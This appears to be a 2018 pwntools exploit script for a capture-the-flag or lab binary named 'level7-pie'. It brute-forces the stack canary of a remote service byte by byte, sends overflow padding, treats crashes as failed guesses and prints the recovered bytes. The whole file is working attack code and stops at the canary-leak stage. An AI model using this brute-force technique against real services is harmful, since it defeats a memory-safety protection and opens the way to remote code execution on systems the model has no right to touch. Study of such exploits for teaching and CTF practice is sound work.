#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
codesec to get canary
"""

from pwn import *
context.log_level="debug"
elf = ELF("./level7-pie")
libc = ELF("./libc-2.23.so")

port = 0x2717
length = 0x40
#r = remote("0.0.0.0", port)
r= remote("10.132.141.60", 22007)
w = r.recv()

'''
to detect the pos of canary
'''


'''
to  detect canary
'''
detect = 'a'*0x40# + chr(0) + chr(73) + chr(58) + chr(11)
lis = []

for j in range(4):
  for i in range(256):
    if i == 10:
        continue
    p =''.join([chr(x) for x in lis])+ chr(i)
    ir = remote("10.132.141.60",22007)
    ir.recv()

    ir.sendline(detect + p)
    try:
       ww = ir.recv()
    except:
       print "smash!!"
       #raise Exception("Invalid level!", i)
       ir.close()
    else:
       print i
       print ww
       lis.append(i)
       ir.close()
       break

print ''.join([chr(x) for x in lis])
for x in lis:
    print x
print "=============="
